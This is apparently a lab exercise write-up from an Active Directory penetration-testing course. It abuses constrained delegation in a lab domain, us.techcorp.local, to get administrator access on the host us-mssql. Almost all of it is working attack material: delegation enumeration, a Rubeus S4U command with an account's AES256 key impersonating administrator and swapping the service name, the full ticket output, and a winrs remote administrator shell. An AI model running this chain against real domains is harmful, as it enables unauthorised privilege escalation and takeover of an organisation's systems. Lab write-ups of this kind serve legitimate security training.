# HANDS-ON 12:

```
Abuse Constrained delegation in us.techcorp.local to escalate privileges on a machine to Domain
Admin.

```


## Enumerta objects

```
 Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo


DistinguishedName        : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {CIFS/us-mssql.us.techcorp.local, CIFS/us-mssql}
Name                     : appsvc
ObjectClass              : user
ObjectGUID               : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c

DistinguishedName        : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
msDS-AllowedToDelegateTo : {cifs/US-MSSQL.us.techcorp.local, cifs/US-MSSQL}
Name                     : US-MGMT
ObjectClass              : computer
ObjectGUID               : 6f7957b5-d229-4d00-8778-831aa4d9afac

```

Pass the ticket :

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335
[*] Building AS-REQ (w/ preauth) for: 'us.techcorp.local\appsvc'
[*] Using domain controller: 192.168.1.2:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFlDCCBZCgAwIBBaEDAgEWooIEjDCCBIhhggSEMIIEgKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FM
      oiYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbKOCBDowggQ2oAMCARKhAwIBAqKC
      BCgEggQkY1rBIDkshS0fOfT0+FXQRiy8SLIfW4LkJzrBtJS4YNMwaSXJUYRlphLfU+T7yeX+0hZomRtm
      vPXwhu43/DLrfEsimfJyktKb1mVhkvVymsRXC1puUm4/wGKod7b4RRe3mv0buOJEIaMHjD1lQqqCM/VZ
      lvTml4U68wogq0RzSVQat+7oGHlrdN70bQ/5mgDjEECymWQ9dN9c1pu1T4kjHl4QZSHES8+mLBUTpxRv
      UuoyhLkpd1lvk/L/Z3uexfqtDDFjri7mP8j7NlN4TMRy/bkS/9lhv76GrfYHb2PFpkXdTCGQVjIf5W2Y
      OJml8MwRY/zBSjlDq2oSQ4a2HdwVFLjfvK/nkzdv5oXzjYD5riCYAqb04PSU+cjZ2mb94yijroB9dGRk
      ilo/vXiqLqC76eHyDNZANTTl/9dMUhf09ity8rkB13LHzUJkv2XORHr28UzPZaEGJFODsq1bzlUxeDQ3
      /2q6iptIwgZqF25a3nH4sidJXsqdvIc3neBt0DxiTLIDCJSA8070zcw/9g4m8HDjJZLhdErYyAy8z1DA
      0tI7OQ5Em9EhMXNShQD/XHaFeweELTJkt1kpMhdIvn7iqPuFYKbjHCS21ZTxwbULWIB5EzN6S3F5fPkR
      rV0qykbSov307YHvJWWv40lMOnUkpVF5xg6owKtkcSBZcsTFpGYfOL88UA32COxk5EW/AAhfXSwGiS+G
      iXfxXeHKEagaf4DYzirT2b/rfFABMl/flo3MOJqsIbycxry7miwd2I/T0WRvccavKdkAPoqE+ZtgV9xw
      T38wUQyQHQmGXG/XNFVKLfa5GhOuBcv+kxofP9ZlZiYI9rNGswJRt+MqjSUUEoRbcinRk7wsTnl6+GWN
      ULX2dxUyA45NnTpHnnqCHR4LqRzOsiiiB43PT1pw/zbtJpcBC9purDUm1DceXH2HyYPR8xLa7sQuxTPR
      D802NmrXUFKMDl3wRFjqigpuPehhjC646g07g56aLI2d567QnDoOXFBaqhYrHTJ2l5YXb6cnh88czTQf
      QJw2dIHIdPktFrWOAlPZX0Hgr1BNp5o8so4Rt0hz6o5TkN/9lCp/jyY5mdjv8ZL5Kh/WM7HWa6mJo0Wt
      1laILfNQWGg04p3g5roSIOdymKUYEPRpctTBeEA8oFfXbH7hZqOsJKo4OYN2txquzalfVrbmalXey8K3
      0C/OphkX3f6fR9dDF58QaFtqPblFGVkMMo5iW3RSApTXH0RT43NYiqiauRPs5go4TlaLvkt+hck+iwqP
      FcMuCZMY58FvA4XijHvkSCU1VCnVuSBVsHOrHDVIePMkWyJDAo9HUFdanxXlDtocE/ZcHkXNn+RL1Xhi
      nXntjNF8NUcxWYJgFxBPP+Tfgm2lQbM/xziiWxwPXyTwPjaUGS1MCSXnk+/sZqOB8zCB8KADAgEAooHo
      BIHlfYHiMIHfoIHcMIHZMIHWoCswKaADAgESoSIEIG/Ia5VS4IeaSxu+Gb1W1QHLucJaTMrqHmgOu0JA
      tqhuoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMohMwEaADAgEBoQowCBsGYXBwc3ZjowcDBQBA4QAApREYDzIw
      MjMwMjE5MDAzODE2WqYRGA8yMDIzMDIxOTEwMzgxNlqnERgPMjAyMzAyMjYwMDM4MTZaqBMbEVVTLlRF
      Q0hDT1JQLkxPQ0FMqSYwJKADAgECoR0wGxsGa3JidGd0GxF1cy50ZWNoY29ycC5sb2NhbA==


[*] Action: S4U

[*] Building S4U2self request for: 'appsvc@US.TECHCORP.LOCAL'
[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[*] Sending S4U2self request to 192.168.1.2:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'appsvc@US.TECHCORP.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator' to target SPN 'CIFS/us-mssql.us.techcorp.local'
[*]   Final ticket will be for the alternate service 'HTTP'
[*] Building S4U2proxy request for service: 'CIFS/us-mssql.us.techcorp.local'
[*] Using domain controller: US-DC.us.techcorp.local (192.168.1.2)
[*] Sending S4U2proxy request to domain controller 192.168.1.2:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'HTTP'
[*] base64(ticket.kirbi) for SPN 'HTTP/us-mssql.us.techcorp.local':

      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
      cy50ZWNoY29ycC5sb2NhbA==
[+] Ticket successfully imported!
```
validation of klist:

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x40d20

Cached Tickets: (1)

#0>     Client: administrator @ US.TECHCORP.LOCAL
        Server: HTTP/us-mssql.us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/18/2023 16:46:33 (local)
        End Time:   2/19/2023 2:46:33 (local)
        Renew Time: 2/25/2023 16:46:33 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```
Access such administrator onus-mssql:
```
PS C:\Windows\system32> winrs -r:us-mssql.us.techcorp.local cmd.exe
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\administrator.US>whoami
whoami
us\administrator

C:\Users\administrator.US>hostname
hostname
US-MSSQL

C:\Users\administrator.US>
```


